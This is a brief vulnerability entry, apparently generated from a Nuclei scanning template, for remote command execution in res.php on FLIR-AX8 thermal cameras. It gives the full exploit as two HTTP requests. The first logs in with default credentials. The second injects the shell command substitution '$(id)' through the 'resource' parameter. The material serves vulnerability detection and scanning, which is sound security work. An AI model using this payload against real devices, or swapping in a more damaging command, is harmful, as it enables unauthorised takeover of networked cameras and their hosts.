# Vulnerability: FLIR-AX8 res.php - Remote Code Execution
**Classification:** FLIR-AX8
**Source:** Nuclei Template (`flir-ax8-rce.yaml`)

## Description
Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login/dologin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user_name={{username}}&user_password={{password}}

POST /res.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=node&resource=$(id)
```

